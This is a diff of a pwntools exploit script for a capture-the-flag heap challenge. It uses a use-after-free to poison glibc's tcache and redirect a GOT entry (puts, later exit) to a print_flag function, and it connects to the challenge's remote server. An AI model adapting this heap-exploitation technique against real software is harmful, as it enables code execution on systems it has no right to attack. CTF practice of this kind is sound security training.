@@ -1,66 +1,68 @@
 #!/usr/bin/env python3
 from pwn import *
+context.arch = "amd64"
+context.terminal = ["kitty-pwn"] # ["tmux", "split-window", "-h"]
 
-exe = ELF("./vuln")
-context.binary = exe
+PROCESS_PATH = "./vuln"
+
+e = ELF(PROCESS_PATH, checksec=False)
+
+EXIT_GOT = e.got['exit']
+print(f"exit_got = {hex(EXIT_GOT)}")
+PRINT_FLAG = 0x401654
 
 if args.REMOTE:
-    r = remote("chals.disorientation.cssa.club", 9824)
+    io = remote("chals.disorientation.cssa.club", 9824)
 else:
-    r = process(exe.path)
-    if args.GDB:
-        gdb.attach(r)
-
-# No PIE → fixed addresses
-PUTS_GOT   = 0x403938  
-PRINT_FLAG = 0x401654  
-
-def spill(content):
-    r.sendlineafter(b'> ', b'3')
-    r.sendlineafter(b'chars)\n', content)
-
-def remove(idx):
-    r.sendlineafter(b'> ', b'5')
-    r.sendlineafter(b'Tea index: ', str(idx).encode())
-
-def update(idx, content):
-    r.sendlineafter(b'> ', b'4')
-    r.sendlineafter(b'Tea index: ', str(idx).encode())
-    r.sendlineafter(b'Ok spill the new tea plz:\n', content)
-
-# remove_tea() leaves dangling pointer.
-# update_tea() ignores active flag → UAF write.
-# UAF -> t cache poisoning -> GOT overwrite
-#
-# tea_t (24B)  → tcache[32]
-# content (48B) → tcache[64]
-#
-# glibc 2.31: free() sets fd/key at data[0:16]; tea* at +16 survives.
-# 1–2. Allocate tea0(A,B) and tea1(C,D)
-# 3–4. Free D,C then B,A → both bins count=2; spilled_tea = A (dangling)
-# 5. UAF update: write PUTS_GOT into B->fd (poison tcache[64])
-# 6. malloc ->,B; next tcache[64] = PUTS_GOT
-# 7. malloc ->,PUTS_GOT; overwrite puts@GOT with PRINT_FLAG
-#    Next puts() call → print_flag() → flag
+    io = process(PROCESS_PATH)
+    gdb.attach(io, gdbscript="""
+set pagination off
+b hear_tea
+c
+""")
 
 
+def cmd_exit(io:process|remote):
+    io.sendlineafter(b"> ", b"1")
 
+def cmd_hear(io:process|remote):
+    io.sendlineafter(b"> ", b"2")
 
-# 1–2. Allocate tea0(A,B) and tea1(C,D)
-spill(b"tea zero")
-spill(b"tea one")
+def cmd_spill(io:process|remote, content:bytes=b"A"):
+    io.sendlineafter(b"> ", b"3")
+    io.sendlineafter(b"chars)\n", content)
 
-# 3–4. Free D,C then B,A → both bins count=2; spilled_tea = A (dangling)
-remove(1)                   # free D,C
-remove(0)                   # free B,A (UAF on A)
+def cmd_update(io:process|remote, idx: int, content:bytes):
+    io.sendlineafter(b"> ", b"4")
+    io.sendlineafter(b" index: ", f"{idx}".encode())
+    io.sendlineafter(b" plz:\n", content)
 
-# 5. UAF update: write PUTS_GOT into B->fd (poison tcache[64])
-update(0, p64(PUTS_GOT))    # poison B->fd
+def cmd_remove(io:process|remote, idx: int):
+    io.sendlineafter(b"> ", b"5")
+    io.sendlineafter(b" index: ", f"{idx}".encode())
 
-# 6. malloc ->,B; next tcache[64] = PUTS_GOT
-spill(b"consume")           # pop A,B
+def exploit():
+    # in idx 0, 1
+    cmd_spill(io)
+    cmd_spill(io)
+    
+    # now in tcache
+    cmd_remove(io, 1)
+    cmd_remove(io, 0)
+    
+    # No safe linking
+    # UAF tcache poisoning CHUNK 0 -> CHUNK 1
+    #            now CHUNK 0 -> EXIT_GOT
+    cmd_update(io, 0, p64(EXIT_GOT))
 
-# 7. malloc ->,PUTS_GOT; overwrite puts@GOT with PRINT_FLAG
-spill(p64(PRINT_FLAG))      
+    # cmd_hear(io) # To trigger the debugger
+    
+    cmd_spill(io)
+    cmd_spill(io, p64(PRINT_FLAG)) #poisoned in idx 1
 
-r.interactive()
+    # Trigger the exit() -> print_flag()
+    cmd_exit(io)
+
+if __name__ == "__main__":
+    exploit()
+    io.interactive()
